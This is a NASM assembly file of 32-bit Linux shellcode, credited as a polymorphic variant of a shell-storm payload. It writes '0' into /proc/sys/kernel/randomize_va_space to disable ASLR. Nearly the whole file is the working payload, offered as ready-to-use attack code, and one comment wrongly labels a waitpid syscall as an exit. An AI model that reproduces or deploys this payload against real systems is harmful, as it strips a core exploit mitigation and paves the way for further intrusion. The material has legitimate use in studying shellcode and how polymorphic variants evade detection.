; Filename: original.nasm
; Author: Jean Pascal Pereira <pereira@secbiz.de>
; Polymorphic Author: Kevin Kirsche
; Website: http://shell-storm.org/shellcode/files/shellcode-813.php
; Size: 84 bytes
global _start

section .text

_start:
  sub eax, eax      ; zero out EAX
  push eax          ; push null terminator
  push 0x65636170   ; ecap
  push 0x735f6176   ; s_av
  push 0x5f657a69   ; _ezi
  push 0x6d6f646e   ; modn
  push 0x61722f6c   ; ar/l
  push 0x656e7265   ; enre
  push 0x6b2f7379   ; k/sy
  push 0x732f636f   ; s/co
  push 0x72702f2f   ; rp// (end of //proc/sys/kernel/randomize_va_space w/ null terminator)
  mov ebx, esp      ; mov pointer to string into EBX
  mov cx, 0x2bc     ; 700 decimal / 0x2bc hex - this is our mode argument for create
  mov al, 0x8       ; SYS_CREAT system call
  int 0x80          ; trigger SYS_CREAT
  xchg ebx, eax      ; move our file descriptor into EBX
  push eax          ; push the file descriptor onto the stack
  mov dx, 0x3a30    ; 0x3a30 hex is 14896 decimal
  push dx           ; push this value onto the stack
  mov ecx, esp      ; pointer to our buffer — const char __user *buf
  sub edx, edx      ; clear EDX
  inc edx           ; EDX is 1 — size_t count
  push 0x3
  pop eax
  inc eax
  int 0x80          ; trigger SYS_WRITE
  mov al, 0x6       ; SYS_CLOSE system call
  int 0x80          ; trigger the SYS_CLOSE to close the file
  inc eax           ; 0x7 - SYS_WAITPID
  int 0x80          ; exit the app
